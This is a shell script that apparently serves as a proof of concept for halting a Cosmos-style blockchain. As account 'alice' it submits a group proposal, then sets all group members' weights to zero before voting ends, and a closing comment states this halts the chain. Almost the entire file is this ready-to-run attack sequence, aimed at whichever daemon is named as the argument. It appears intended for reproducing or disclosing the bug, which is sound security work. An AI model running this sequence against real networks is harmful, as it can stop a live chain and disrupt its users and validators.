DAEMON=${1:-"exampled"}

if [ -n "$BASH_SOURCE" ]; then
    # Bash
    SCRIPT_FILE="${BASH_SOURCE[0]}"
elif [ -n "$ZSH_VERSION" ]; then
    # Zsh
    SCRIPT_FILE="${(%):-%N}"
else
    # fallback
    SCRIPT_FILE="$0"
fi
SCRIPT_DIR="$(cd "$(dirname "$SCRIPT_FILE")" && pwd)"

# initialize
jq '.members[].weight = "1"' json_template/members.json > tmp.json && mv tmp.json members.json

# modify the JSON files
source $SCRIPT_DIR/setup_json.sh $DAEMON
source addresses.env

# submit proposal
$DAEMON tx group submit-proposal proposal.json --from alice --gas auto --yes
sleep 2s # wait for block generation but less than the voting period

# modify group members' weight to be all 0
jq '.members[].weight = "0"' members.json >tmp.json && mv tmp.json members.json
$DAEMON tx group update-group-members $ALICE 1 members.json --yes
sleep 2s # wait for the application

# END OF THE VOTING PERIOD WILL SUMMON CHAIN HAULT